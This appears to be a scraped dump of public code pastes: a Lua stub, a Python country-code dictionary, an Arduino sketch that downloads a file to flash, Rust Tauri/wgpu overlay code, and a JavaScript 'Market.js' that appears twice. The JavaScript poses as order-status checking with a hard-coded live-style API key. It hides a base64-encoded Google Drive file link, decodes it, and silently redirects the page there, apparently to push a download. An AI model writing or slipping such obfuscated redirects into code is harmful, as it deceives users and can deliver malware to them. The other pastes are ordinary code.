      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g9cu9hLT,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 09:48:03 AM CDT,"
--ccpm_filename index.lua
local module = require(""folder.module"")
--ccpm_filename folder/module.lua
return {}"
YGf9LBSF,Market.js,WassupDog45,JavaScript,Friday 4th of April 2025 09:27:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/264/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M9uhZ2gC,Dictionary of Country Codes Python,CodeCrusader,Python,Friday 4th of April 2025 09:21:19 AM CDT,"countryCodes = {
    'AD': 'Andorra',
    'AE': 'United Arab Emirates',
    'AF': 'Afghanistan',
    'AG': 'Antigua and Barbuda',
    'AI': 'Anguilla',
    'AL': 'Albania',
    'AM': 'Armenia',
    'AO': 'Angola',
    'AR': 'Argentina',
    'AS': 'American Samoa',
    'AT': 'Austria',
    'AU': 'Australia',
    'AW': 'Aruba',
    'AX': 'Åland Islands',
    'AZ': 'Azerbaijan',
    'BA': 'Bosnia and Herzegovina',
    'BB': 'Barbados',
    'BD': 'Bangladesh',
    'BE': 'Belgium',
    'BF': 'Burkina Faso',
    'BG': 'Bulgaria',
    'BH': 'Bahrain',
    'BI': 'Burundi',
    'BJ': 'Benin',
    'BL': 'Saint Barthélemy',
    'BM': 'Bermuda',
    'BN': 'Brunei Darussalam',
    'BO': 'Bolivia',
    'BQ': 'Bonaire, Sint Eustatius and Saba',
    'BR': 'Brazil',
    'BS': 'Bahamas',
    'BT': 'Bhutan',
    'BV': 'Bouvet Island',
    'BW': 'Botswana',
    'BY': 'Belarus',
    'BZ': 'Belize',
    'CA': 'Canada',
    'CC': 'Cocos (Keeling) Islands',
    'CD': 'Congo, Democratic Republic of the',
    'CF': 'Central African Republic',
    'CG': 'Congo',
    'CH': 'Switzerland',
    'CI': 'Côte d\'Ivoire',
    'CK': 'Cook Islands',
    'CL': 'Chile',
    'CM': 'Cameroon',
    'CN': 'China',
    'CO': 'Colombia',
    'CR': 'Costa Rica',
    'CU': 'Cuba',
    'CV': 'Cabo Verde',
    'CW': 'Curaçao',
    'CX': 'Christmas Island',
    'CY': 'Cyprus',
    'CZ': 'Czechia',
    'DE': 'Germany',
    'DJ': 'Djibouti',
    'DK': 'Denmark',
    'DM': 'Dominica',
    'DO': 'Dominican Republic',
    'DZ': 'Algeria',
    'EC': 'Ecuador',
    'EE': 'Estonia',
    'EG': 'Egypt',
    'EH': 'Western Sahara',
    'ER': 'Eritrea',
    'ES': 'Spain',
    'ET': 'Ethiopia',
    'FI': 'Finland',
    'FJ': 'Fiji',
    'FM': 'Micronesia (Federated States of)',
    'FO': 'Faroe Islands',
    'FR': 'France',
    'GA': 'Gabon',
    'GB': 'United Kingdom of Great Britain and Northern Ireland',
    'GD': 'Grenada',
    'GE': 'Georgia',
    'GF': 'French Guiana',
    'GG': 'Guernsey',
    'GH': 'Ghana',
    'GI': 'Gibraltar',
    'GL': 'Greenland',
    'GM': 'Gambia',
    'GN': 'Guinea',
    'GP': 'Guadeloupe',
    'GQ': 'Equatorial Guinea',
    'GR': 'Greece',
    'GT': 'Guatemala',
    'GU': 'Guam',
    'GW': 'Guinea-Bissau',
    'GY': 'Guyana',
    'HK': 'Hong Kong',
    'HM': 'Heard Island and McDonald Islands',
    'HN': 'Honduras',
    'HR': 'Croatia',
    'HT': 'Haiti',
    'HU': 'Hungary',
    'ID': 'Indonesia',
    'IE': 'Ireland',
    'IL': 'Israel',
    'IM': 'Isle of Man',
    'IN': 'India',
    'IO': 'British Indian Ocean Territory',
    'IQ': 'Iraq',
    'IR': 'Iran (Islamic Republic of)',
    'IS': 'Iceland',
    'IT': 'Italy',
    'JE': 'Jersey',
    'JM': 'Jamaica',
    'JO': 'Jordan',
    'JP': 'Japan',
    'KE': 'Kenya',
    'KG': 'Kyrgyzstan',
    'KH': 'Cambodia',
    'KI': 'Kiribati',
    'KM': 'Comoros',
    'KN': 'Saint Kitts and Nevis',
    'KP': 'Korea (Democratic People\'s Republic of)',
    'KR': 'Korea (Republic of)',
    'KW': 'Kuwait',
    'KY': 'Cayman Islands',
    'KZ': 'Kazakhstan',
    'LA': 'Lao People\'s Democratic Republic',
    'LB': 'Lebanon',
    'LC': 'Saint Lucia',
    'LI': 'Liechtenstein',
    'LK': 'Sri Lanka',
    'LR': 'Liberia',
    'LS': 'Lesotho',
    'LT': 'Lithuania',
    'LU': 'Luxembourg',
    'LV': 'Latvia',
    'LY': 'Libya',
    'MA': 'Morocco',
    'MC': 'Monaco',
    'MD': 'Moldova (Republic of)',
    'ME': 'Montenegro',
    'MF': 'Saint Martin (French part)',
    'MG': 'Madagascar',
    'MH': 'Marshall Islands',
    'MK': 'North Macedonia',
    'ML': 'Mali',
    'MM': 'Myanmar',
    'MN': 'Mongolia',
    'MO': 'Macao',
    'MP': 'Northern Mariana Islands',
    'MQ': 'Martinique',
    'MR': 'Mauritania',
    'MS': 'Montserrat',
    'MT': 'Malta',
    'MU': 'Mauritius',
    'MV': 'Maldives',
    'MW': 'Malawi',
    'MX': 'Mexico',
    'MY': 'Malaysia',
    'MZ': 'Mozambique',
    'NA': 'Namibia',
    'NC': 'New Caledonia',
    'NE': 'Niger',
    'NF': 'Norfolk Island',
    'NG': 'Nigeria',
    'NI': 'Nicaragua',
    'NL': 'Netherlands',
    'NO': 'Norway',
    'NP': 'Nepal',
    'NR': 'Nauru',
    'NU': 'Niue',
    'NZ': 'New Zealand',
    'OM': 'Oman',
    'PA': 'Panama',
    'PE': 'Peru',
    'PF': 'French Polynesia',
    'PG': 'Papua New Guinea',
    'PH': 'Philippines',
    'PK': 'Pakistan',
    'PL': 'Poland',
    'PM': 'Saint Pierre and Miquelon',
    'PN': 'Pitcairn',
    'PR': 'Puerto Rico',
    'PT': 'Portugal',
    'PW': 'Palau',
    'PY': 'Paraguay',
    'QA': 'Qatar',
    'RE': 'Réunion',
    'RO': 'Romania',
    'RS': 'Serbia',
    'RU': 'Russian Federation',
    'RW': 'Rwanda',
    'SA': 'Saudi Arabia',
    'SB': 'Solomon Islands',
    'SC': 'Seychelles',
    'SD': 'Sudan',
    'SE': 'Sweden',
    'SG': 'Singapore',
    'SH': 'Saint Helena, Ascension and Tristan da Cunha',
    'SI': 'Slovenia',
    'SJ': 'Svalbard and Jan Mayen',
    'SK': 'Slovakia',
    'SL': 'Sierra Leone',
    'SM': 'San Marino',
    'SN': 'Senegal',
    'SO': 'Somalia',
    'SR': 'Suriname',
    'SS': 'South Sudan',
    'ST': 'Sao Tome and Principe',
    'SV': 'El Salvador',
    'SX': 'Sint Maarten (Dutch part)',
    'SY': 'Syrian Arab Republic',
    'SZ': 'Eswatini',
    'TC': 'Turks and Caicos Islands',
    'TD': 'Chad',
    'TF': 'French Southern Territories',
    'TG': 'Togo',
    'TH': 'Thailand',
    'TJ': 'Tajikistan',
    'TK': 'Tokelau',
    'TL': 'Timor-Leste',
    'TM': 'Turkmenistan',
    'TN': 'Tunisia',
    'TO': 'Tonga',
    'TR': 'Türkiye',
    'TT': 'Trinidad and Tobago',
    'TV': 'Tuvalu',
    'TW': 'Taiwan',
    'TZ': 'Tanzania, United Republic of',
    'UA': 'Ukraine',
    'UG': 'Uganda',
    'US': 'United States of America',
    'UY': 'Uruguay',
    'UZ': 'Uzbekistan',
    'VA': 'Holy See',
    'VC': 'Saint Vincent and the Grenadines',
    'VE': 'Venezuela (Bolivarian Republic of)',
    'VG': 'Virgin Islands (British)',
    'VI': 'Virgin Islands (U.S.)',
    'VN': 'Viet Nam',
    'VU': 'Vanuatu',
    'WF': 'Wallis and Futuna',
    'WS': 'Samoa',
    'YE': 'Yemen',
    'YT': 'Mayotte',
    'ZA': 'South Africa',
    'ZM': 'Zambia',
    'ZW': 'Zimbabwe'
    }"
py9PR9Ln,arduino download to SPIFFS,honey_the_codewitch,C++,Friday 4th of April 2025 09:20:03 AM CDT,"#include ""Arduino.h""
#include ""WiFi.h""
#include ""SPIFFS.h""
#include ""HTTPClient.h""

HTTPClient http;
uint8_t buffer[8192];
constexpr static const char* url = ""http://192.168.54.12/test.bin"";
void setup() {
    Serial.begin(115200);
    char ssid[65];
    ssid[0] = 0;
    char pass[129];
    pass[0] = 0;
    SPIFFS.begin(); 
    // check SPIFFS for /wifi.txt.
    // first line is ssid, second line is password
    bool loaded = false;
    puts(""Looking for wifi.txt creds on internal flash"");
    if (SPIFFS.exists(""/wifi.txt"")) {
        File file = SPIFFS.open(""/wifi.txt"", ""r"");
        // parse the file
        String str = file.readStringUntil('\n');
        if (str.endsWith(""\r"")) {
            str = str.substring(0, str.length() - 1);
        }
        strncpy(ssid, str.c_str(), sizeof(ssid));
        str = file.readStringUntil('\n');
        file.close();
        if (str.endsWith(""\r"")) {
            str = str.substring(0, str.length() - 1);
        }
        strncpy(pass, str.c_str(), sizeof(pass));
        loaded = true;
    }
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    // if we found wifi.txt, start the connection process:
    if (loaded) {
        printf(""Read wifi.txt. Connecting to %s\n"", ssid);
        WiFi.begin(ssid, pass);
    } else {
        puts(""wifi.txt not found - using remembered creds"");
        WiFi.begin();
    }
    // there are more steps to using https, not covered here
    if(http.begin(url)) {
        File dst = SPIFFS.open(""/test.bin"",""wb"",true);
        NetworkClient src = http.getStream();
        while(1) {
            size_t bytes_read = src.readBytes(buffer,sizeof(buffer));
            if(bytes_read==0) {
                break;
            }
            dst.write(buffer,bytes_read);
        }
        dst.close();
    }
    http.end();
    
}
void loop() {

}"
kWTYN1GX,Untitled,Armaldio,Rust,Friday 4th of April 2025 09:01:26 AM CDT,"use futures_util::StreamExt;
use std::env;
use std::error::Error;
use std::net::SocketAddr;
use std::sync::Arc;
use std::{borrow::Cow, sync::Mutex, time::Instant};
use steamworks::AppId;
use steamworks::Client;
use steamworks::FriendFlags;
use steamworks::PersonaStateChange;
use tauri::Window;
use tauri::{
    async_runtime, LogicalPosition, LogicalSize, Manager, RunEvent, WebviewUrl, WindowEvent,
};
use tokio::sync::mpsc::{Receiver, Sender};
use warp::Filter;

pub struct WgpuState<'win> {
    pub queue: wgpu::Queue,
    pub device: wgpu::Device,
    pub surface: wgpu::Surface<'win>,
    pub render_pipeline: wgpu::RenderPipeline,
    pub config: Mutex<wgpu::SurfaceConfiguration>,
}

impl<'win> WgpuState<'win> {
    pub async fn new(window: Window) -> Self {
        let size = window.inner_size().unwrap();
        let instance = wgpu::Instance::default();
        let surface = instance.create_surface(window).unwrap();

        let adapters = instance.enumerate_adapters(wgpu::Backends::all()); // Enumerate all backends

        println!(""Available wgpu backends:"");
        for adapter in adapters {
            let info = adapter.get_info();
            println!(""- {:?}: {:?}"", info.backend, info.name);
        }

        let adapter = instance
            .request_adapter(&wgpu::RequestAdapterOptions {
                power_preference: wgpu::PowerPreference::default(),
                force_fallback_adapter: false,
                compatible_surface: Some(&surface),
            })
            .await
            .expect(""Failed to find an appropriate adapter"");

        let (device, queue) = adapter
            .request_device(
                &wgpu::DeviceDescriptor {
                    label: None,
                    required_features: wgpu::Features::empty(),
                    required_limits: wgpu::Limits::downlevel_webgl2_defaults()
                        .using_resolution(adapter.limits()),
                },
                None,
            )
            .await
            .expect(""Failed to create device"");

        let shader = device.create_shader_module(wgpu::ShaderModuleDescriptor {
            label: None,
            source: wgpu::ShaderSource::Wgsl(Cow::Borrowed(
                r#""
@vertex
fn vs_main(@builtin(vertex_index) vertex_index: u32) -> @builtin(position) vec4<f32> {
    var position: vec4<f32>;
    switch (vertex_index) {
        case 0u: {
            position = vec4<f32>(-1.0, -1.0, 0.0, 1.0); // Bottom-left
        }
        case 1u: {
            position = vec4<f32>( 1.0, -1.0, 0.0, 1.0); // Bottom-right
        }
        case 2u: {
            position = vec4<f32>( 0.0,  1.0, 0.0, 1.0); // Top-center
        }
        default: {
            position = vec4<f32>(0.0, 0.0, 0.0, 1.0); // Default case (should not be reached)
        }
    }
    return position;
}

@fragment
fn fs_main() -> @location(0) vec4<f32> {
    // Output a solid color
    return vec4<f32>(1.0, 0.0, 0.0, 0.5); // Green
}

    ""#,
            )),
        });

        let pipeline_layout = device.create_pipeline_layout(&wgpu::PipelineLayoutDescriptor {
            label: None,
            push_constant_ranges: &[],
            bind_group_layouts: &[],
        });

        let swapchain_capabilities = surface.get_capabilities(&adapter);
        println!(""swapchain_capabilities {:?}"", swapchain_capabilities);
        let swapchain_format = swapchain_capabilities.formats[0];

        let render_pipeline = device.create_render_pipeline(&wgpu::RenderPipelineDescriptor {
            label: None,
            layout: Some(&pipeline_layout),
            vertex: wgpu::VertexState {
                module: &shader,
                entry_point: ""vs_main"",
                buffers: &[],
                compilation_options: wgpu::PipelineCompilationOptions::default(),
            },
            fragment: Some(wgpu::FragmentState {
                module: &shader,
                entry_point: ""fs_main"",
                targets: &[Some(wgpu::ColorTargetState {
                    format: swapchain_format,
                    blend: Some(wgpu::BlendState::ALPHA_BLENDING),
                    write_mask: wgpu::ColorWrites::ALL,
                })],
                compilation_options: wgpu::PipelineCompilationOptions::default(),
            }),
            primitive: wgpu::PrimitiveState::default(),
            depth_stencil: None,
            multisample: wgpu::MultisampleState::default(),
            multiview: None,
        });

        if swapchain_capabilities
            .alpha_modes
            .contains(&wgpu::CompositeAlphaMode::PreMultiplied)
        {
            println!(""PreMultiplied alpha mode is supported!"");
        } else if swapchain_capabilities
            .alpha_modes
            .contains(&wgpu::CompositeAlphaMode::Opaque)
        {
            println!(""Only Opaque alpha mode is supported. Transparency will not work."");
        } else {
            println!(""No known alpha modes are supported."");
        }

        let alpha_mode = if swapchain_capabilities
            .alpha_modes
            .contains(&wgpu::CompositeAlphaMode::PreMultiplied)
        {
            wgpu::CompositeAlphaMode::PreMultiplied
        } else {
            swapchain_capabilities.alpha_modes[0]
        };

        let config = wgpu::SurfaceConfiguration {
            width: size.width,
            height: size.height,
            format: swapchain_format,
            usage: wgpu::TextureUsages::RENDER_ATTACHMENT | wgpu::TextureUsages::COPY_SRC,
            present_mode: wgpu::PresentMode::Fifo,
            alpha_mode,
            view_formats: vec![],
            desired_maximum_frame_latency: 2,
        };

        surface.configure(&device, &config);

        Self {
            device,
            queue,
            surface,
            render_pipeline,
            config: Mutex::new(config),
        }
    }
}

#[tauri::command]
fn showOverlay() {
    println!(""Showing overlay"");
    match Client::init_app(480) {
        Ok((client, _single)) => {
            println!(""Client created"");
            client.friends().activate_game_overlay(""hey"");
            println!(""Overlay shown"");
        }
        Err(e) => eprintln!(""Failed to initialize Steam client: {:?}"", e),
    }
}

async fn websocket_server(tx: Sender<String>, mut rx: Receiver<String>) {
    let addr = SocketAddr::from(([127, 0, 0, 1], 31753));

    // WebSocket upgrade
    let ws_route = warp::path::end()
        .and(warp::ws())
        .map(move |ws: warp::ws::Ws| {
            let tx = tx.clone();
            ws.on_upgrade(move |websocket| async move {
                let (mut ws_tx, mut ws_rx) = websocket.split();

                // Forward messages to the sender
                while let Some(result) = ws_rx.next().await {
                    if let Ok(msg) = result {
                        if let Ok(text) = msg.to_str() {
                            println!(""Received WebSocket message: {}"", text);
                            if tx.send(text.to_string()).await.is_err() {
                                eprintln!(""Failed to send message to channel"");
                                break;
                            }
                        }
                    }
                }
            })
        });

    let routes = ws_route;

    // Spawn HTTP server
    tokio::spawn(warp::serve(routes).run(addr));
    println!(""WebSocket server running on ws://{}"", addr);

    // Process messages from the receiver
    while let Some(message) = rx.recv().await {
        println!(""Processing message: {}"", message);
        // Handle messages as needed
    }
}

fn setup_wgpu_overlay(app: &mut tauri::App) -> Result<(), Box<dyn std::error::Error>> {
    println!(""Webgpu rendering"");

    // let window = app.get_webview_window(""main"").unwrap();
    let _window = tauri::window::WindowBuilder::new(app, ""main"")
        .inner_size(800.0, 600.0)
        .transparent(true)
        .build()?;
    let overlay = tauri::window::WindowBuilder::new(app, ""overlay"")
        .parent(&_window)
        .unwrap()
        .inner_size(800.0, 600.0)
        .transparent(true)
        .always_on_top(true)
        .build()?;
    overlay.set_resizable(false);
    overlay.set_maximizable(false);
    overlay.set_minimizable(false);
    overlay.set_closable(false);
    overlay.set_decorations(false);
    overlay.set_ignore_cursor_events(true);

    let _overlay = Arc::new(Mutex::new(overlay));

    let _webview1 = _window.add_child(
        tauri::webview::WebviewBuilder::new(""main1"", WebviewUrl::App(Default::default()))
            .transparent(true)
            .auto_resize(),
        LogicalPosition::new(0., 0.),
        LogicalSize::new(800.0, 600.0),
    )?;

    // let _webview2 = app
    //     .get_window(""overlay"")
    //     .expect(""Overlay window not found"")
    //     .add_child(
    //         tauri::webview::WebviewBuilder::new(""overlay1"", WebviewUrl::App(Default::default()))
    //             .transparent(true)
    //             .auto_resize(),
    //         LogicalPosition::new(0., 0.),
    //         LogicalSize::new(800.0, 600.0),
    //     )?;

    let overlay_window = app.get_window(""overlay"").expect(""Overlay window not found"");

    let wgpu_state = async_runtime::block_on(WgpuState::new(overlay_window));
    let wgpu_state = Arc::new(wgpu_state); // Make wgpu_state Arc<T>
    app.manage(wgpu_state.clone()); // Store a clone in app state

    Ok(())
}

async fn setup_app<'a>(app: &'a mut tauri::App) -> Result<(), Box<dyn Error>> {
    // Setup HTTP + WebSocket server
    let (tx, rx) = tokio::sync::mpsc::channel::<String>(32);

    tokio::spawn(async move {
        websocket_server(tx, rx).await;
    });

    Ok(())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let init = match Client::init_app(480) {
        Ok(val) => {
            let (client, single) = val;
            let _cb = client.register_callback(|p: PersonaStateChange| {
                println!(""Got callback: {:?}"", p);
            });

            let utils = client.utils();
            println!(""Utils:"");
            println!(""AppId: {:?}"", utils.app_id());
            println!(""UI Language: {}"", utils.ui_language());

            let apps = client.apps();
            println!(""Apps"");
            println!(""IsInstalled(480): {}"", apps.is_app_installed(AppId(480)));
            println!(""InstallDir(480): {}"", apps.app_install_dir(AppId(480)));
            println!(""BuildId: {}"", apps.app_build_id());
            println!(""AppOwner: {:?}"", apps.app_owner());
            println!(""Langs: {:?}"", apps.available_game_languages());
            println!(""Lang: {}"", apps.current_game_language());
            println!(""Beta: {:?}"", apps.current_beta_name());

            let friends = client.friends();
            println!(""Friends"");
            let list = friends.get_friends(FriendFlags::IMMEDIATE);
            println!(""{:?}"", list);
            for f in &list {
                println!(""Friend: {:?} - {}({:?})"", f.id(), f.name(), f.state());
                friends.request_user_information(f.id(), true);
            }
        }
        Err(err) => {
            println!(""Error {}"", err);
        }
    };

    tauri::Builder::default()
        .plugin(tauri_plugin_fs::init())
        .setup(move |app| {
            println!(""setup"");
            let _ = setup_wgpu_overlay(app);
            setup_app(app);
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![showOverlay])
        .build(tauri::generate_context!())
        .expect(""error while running tauri application"")
        .run(|app_handle, event| match event {
            RunEvent::WindowEvent {
                label: _,
                event: WindowEvent::Resized(size),
                ..
            } => {
                let wgpu_state = app_handle.state::<Arc<WgpuState>>();
                let mut config = wgpu_state.config.lock().unwrap();
                config.width = size.width;
                config.height = size.height;
                wgpu_state.surface.configure(&wgpu_state.device, &config);
            }
            RunEvent::MainEventsCleared => {
                let wgpu_state = app_handle.state::<Arc<WgpuState>>();
                let overlay = app_handle
                    .get_window(""overlay"")
                    .expect(""Overlay window not found"");
                let _window = app_handle.get_window(""main"").unwrap();

                let window_position = _window.inner_position().unwrap();
                let window_position2 = _window.outer_position().unwrap();
                let window_size = _window.inner_size().unwrap();
                let window_size2 = _window.outer_size().unwrap();

                println!(""inner_position {:?}"", window_position);
                println!(""outer_position {:?}"", window_position2);
                println!(""inner_size {:?}"", window_size);
                println!(""outer_size {:?}"", window_size2);

                let offsetU = 100 as u32;
                let offsetI = 100 as i32;

                overlay
                    .set_position(LogicalPosition::new(
                        window_position.x + offsetI,
                        window_position.y + offsetI,
                    ))
                    .unwrap();
                // overlay.set_position(window_position).unwrap();
                overlay
                    .set_size(LogicalSize::new(
                        window_size.width - offsetU,
                        window_size.height - offsetU,
                    ))
                    .unwrap();
                // overlay.set_size(window_size).unwrap();

                let t = Instant::now();

                let output = match wgpu_state.surface.get_current_texture() {
                    Ok(output) => output,
                    Err(wgpu::SurfaceError::Lost) => {
                        eprintln!(""Surface lost, recreating surface..."");
                        return ();
                    }
                    Err(wgpu::SurfaceError::OutOfMemory) => {
                        eprintln!(""Out of memory error"");
                        return ();
                    }
                    Err(e) => {
                        eprintln!(""Failed to acquire next swap chain texture: {:?}"", e);
                        return ();
                    }
                };
                let view = output
                    .texture
                    .create_view(&wgpu::TextureViewDescriptor::default());

                let mut encoder = wgpu_state
                    .device
                    .create_command_encoder(&wgpu::CommandEncoderDescriptor { label: None });
                {
                    let mut rpass = encoder.begin_render_pass(&wgpu::RenderPassDescriptor {
                        label: None,
                        color_attachments: &[Some(wgpu::RenderPassColorAttachment {
                            view: &view,
                            resolve_target: None,
                            ops: wgpu::Operations {
                                load: wgpu::LoadOp::Clear(wgpu::Color::RED),
                                store: wgpu::StoreOp::Store,
                            },
                        })],
                        depth_stencil_attachment: None,
                        timestamp_writes: None,
                        occlusion_query_set: None,
                    });
                    rpass.set_pipeline(&wgpu_state.render_pipeline);
                    rpass.draw(0..3, 0..1);
                }

                wgpu_state.queue.submit(Some(encoder.finish()));
                // output.present();

                println!(""Frame rendered in: {}ms"", t.elapsed().as_millis());
            }
            _ => (),
        });
}
"
CnvXj5wF,Untitled,Armaldio,Rust,Friday 4th of April 2025 09:00:27 AM CDT,"use futures_util::StreamExt;
use std::env;
use std::error::Error;
use std::net::SocketAddr;
use std::sync::Arc;
use std::{borrow::Cow, sync::Mutex, time::Instant};
use steamworks::AppId;
use steamworks::Client;
use steamworks::FriendFlags;
use steamworks::PersonaStateChange;
use tauri::WebviewWindow;
use tauri::{async_runtime, Emitter, Manager, RunEvent, WindowEvent};
use tokio::sync::mpsc::{Receiver, Sender};
use tokio::sync::oneshot;
use warp::Filter;

pub struct WgpuState<'win> {
    pub queue: wgpu::Queue,
    pub device: wgpu::Device,
    pub surface: wgpu::Surface<'win>,
    pub render_pipeline: wgpu::RenderPipeline,
    pub config: Mutex<wgpu::SurfaceConfiguration>,
}

impl WgpuState<'_> {
    pub async fn new(window: WebviewWindow) -> Self {
        let size = window.inner_size().unwrap();
        let instance = wgpu::Instance::default();
        let surface = instance.create_surface(window).unwrap();
        let adapter = instance
            .request_adapter(&wgpu::RequestAdapterOptions {
                power_preference: wgpu::PowerPreference::default(),
                force_fallback_adapter: false,
                compatible_surface: Some(&surface),
            })
            .await
            .expect(""Failed to find an appropriate adapter"");

        let (device, queue) = adapter
            .request_device(
                &wgpu::DeviceDescriptor {
                    label: None,
                    required_features: wgpu::Features::empty(),
                    required_limits: wgpu::Limits::downlevel_webgl2_defaults()
                        .using_resolution(adapter.limits()),
                },
                None,
            )
            .await
            .expect(""Failed to create device"");

        let shader = device.create_shader_module(wgpu::ShaderModuleDescriptor {
            label: None,
            source: wgpu::ShaderSource::Wgsl(Cow::Borrowed(
                r#""
@vertex
fn vs_main(@builtin(vertex_index) vertex_index: u32) -> @builtin(position) vec4<f32> {
    var position: vec4<f32>;
    switch (vertex_index) {
        case 0u: {
            position = vec4<f32>(-1.0, -1.0, 0.0, 1.0); // Bottom-left
        }
        case 1u: {
            position = vec4<f32>( 1.0, -1.0, 0.0, 1.0); // Bottom-right
        }
        case 2u: {
            position = vec4<f32>( 0.0,  1.0, 0.0, 1.0); // Top-center
        }
        default: {
            position = vec4<f32>(0.0, 0.0, 0.0, 1.0); // Default case (should not be reached)
        }
    }
    return position;
}

@fragment
fn fs_main() -> @location(0) vec4<f32> {
    // Output a solid color
    return vec4<f32>(0.0, 1.0, 0.0, 0.5); // Green
}

    ""#,
            )),
        });

        let pipeline_layout = device.create_pipeline_layout(&wgpu::PipelineLayoutDescriptor {
            label: None,
            push_constant_ranges: &[],
            bind_group_layouts: &[],
        });

        let swapchain_capabilities = surface.get_capabilities(&adapter);
        println!(""swapchain_capabilities {:?}"", swapchain_capabilities);
        let swapchain_format = swapchain_capabilities.formats[0];

        let render_pipeline = device.create_render_pipeline(&wgpu::RenderPipelineDescriptor {
            label: None,
            layout: Some(&pipeline_layout),
            vertex: wgpu::VertexState {
                module: &shader,
                entry_point: ""vs_main"",
                buffers: &[],
                compilation_options: wgpu::PipelineCompilationOptions::default(),
            },
            fragment: Some(wgpu::FragmentState {
                module: &shader,
                entry_point: ""fs_main"",
                targets: &[Some(wgpu::ColorTargetState {
                    format: swapchain_format,
                    blend: Some(wgpu::BlendState::ALPHA_BLENDING),
                    write_mask: wgpu::ColorWrites::ALL,
                })],
                compilation_options: wgpu::PipelineCompilationOptions::default(),
            }),
            primitive: wgpu::PrimitiveState::default(),
            depth_stencil: None,
            multisample: wgpu::MultisampleState::default(),
            multiview: None,
        });

        let alpha_mode = if swapchain_capabilities
            .alpha_modes
            .contains(&wgpu::CompositeAlphaMode::PreMultiplied)
        {
            wgpu::CompositeAlphaMode::PreMultiplied
        } else {
            swapchain_capabilities.alpha_modes[0]
        };

        let config = wgpu::SurfaceConfiguration {
            width: size.width,
            height: size.height,
            format: swapchain_format,
            usage: wgpu::TextureUsages::RENDER_ATTACHMENT | wgpu::TextureUsages::COPY_SRC,
            present_mode: wgpu::PresentMode::Fifo,
            alpha_mode,
            view_formats: vec![],
            desired_maximum_frame_latency: 2,
        };

        surface.configure(&device, &config);

        Self {
            device,
            queue,
            surface,
            render_pipeline,
            config: Mutex::new(config),
        }
    }
}

#[tauri::command]
fn showOverlay() {
    println!(""Showing overlay"");
    match Client::init_app(480) {
        Ok((client, _single)) => {
            println!(""Client created"");
            client.friends().activate_game_overlay(""hey"");
            println!(""Overlay shown"");
        }
        Err(e) => eprintln!(""Failed to initialize Steam client: {:?}"", e),
    }
}

async fn websocket_server(tx: Sender<String>, mut rx: Receiver<String>) {
    let addr = SocketAddr::from(([127, 0, 0, 1], 31753));

    // WebSocket upgrade
    let ws_route = warp::path::end()
        .and(warp::ws())
        .map(move |ws: warp::ws::Ws| {
            let tx = tx.clone();
            ws.on_upgrade(move |websocket| async move {
                let (mut ws_tx, mut ws_rx) = websocket.split();

                // Forward messages to the sender
                while let Some(result) = ws_rx.next().await {
                    if let Ok(msg) = result {
                        if let Ok(text) = msg.to_str() {
                            println!(""Received WebSocket message: {}"", text);
                            if tx.send(text.to_string()).await.is_err() {
                                eprintln!(""Failed to send message to channel"");
                                break;
                            }
                        }
                    }
                }
            })
        });

    let routes = ws_route;

    // Spawn HTTP server
    tokio::spawn(warp::serve(routes).run(addr));
    println!(""WebSocket server running on ws://{}"", addr);

    // Process messages from the receiver
    while let Some(message) = rx.recv().await {
        println!(""Processing message: {}"", message);
        // Handle messages as needed
    }
}

fn setup_wgpu_overlay(app: &mut tauri::App) -> Result<(), Box<dyn std::error::Error>> {
    println!(""Webgpu rendering"");

    let window = app.get_webview_window(""main"").unwrap();
    let size = window.inner_size()?;

    // Create a WgpuState (containing the device, instance, adapter etc.)
    // And store it in the state
    let wgpu_state = async_runtime::block_on(WgpuState::new(window));
    app.manage(Arc::new(wgpu_state));

    let app_handle = app.app_handle().clone();

    async_runtime::spawn(async move {
        let wgpu_state = app_handle.state::<Arc<WgpuState>>();

        while true {
            let t = Instant::now();

            let output = match wgpu_state.surface.get_current_texture() {
                Ok(output) => output,
                Err(wgpu::SurfaceError::Lost) => {
                    println!(""Surface lost, recreating surface..."");
                    continue;
                }
                Err(wgpu::SurfaceError::OutOfMemory) => {
                    eprintln!(""Out of memory error"");
                    continue;
                }
                Err(e) => {
                    eprintln!(""Failed to acquire next swap chain texture: {:?}"", e);
                    continue;
                }
            };
            // let view = output
            //     .texture
            //     .create_view(&wgpu::TextureViewDescriptor::default());

            // let mut encoder = wgpu_state
            //     .device
            //     .create_command_encoder(&wgpu::CommandEncoderDescriptor { label: None });
            // {
